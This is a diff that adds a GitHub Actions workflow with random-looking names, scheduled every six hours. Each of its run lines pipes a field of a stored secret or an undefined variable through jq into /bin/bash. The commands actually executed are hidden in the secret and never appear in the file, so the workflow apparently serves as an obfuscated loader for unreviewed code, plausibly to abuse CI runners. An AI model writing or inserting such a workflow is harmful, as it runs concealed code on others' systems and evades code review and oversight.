@@ -1,0 +1,30 @@
+name: glisteningpartridges
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: glisteningpartridges
+        env:
+          urtz58: ${{ secrets.urtz58 }}
+        run: |
+          echo $urtz58 | jq -r .xesb365 | /bin/bash
+          echo $pxuwy74138 | jq -r .kit766 | /bin/bash
+          echo $wjvq02150 | jq -r .pzenf3 | /bin/bash
+          echo $o1 | jq -r .kjpb69 | /bin/bash
+          echo $lcssa516 | jq -r .wgzg439 | /bin/bash
+          echo $r5951 | jq -r .cryxr9 | /bin/bash
+          echo $bsymf6480 | jq -r .f49887 | /bin/bash
+          echo $l94 | jq -r .em3 | /bin/bash
+          echo $rfi1 | jq -r .s86 | /bin/bash
+          echo $vvg94485 | jq -r .pql06997 | /bin/bash
+          echo $cdv47 | jq -r .itatp51 | /bin/bash
+          echo $hadg40272 | jq -r .sal98 | /bin/bash
+          echo $yzo31 | jq -r .lgt260 | /bin/bash
+
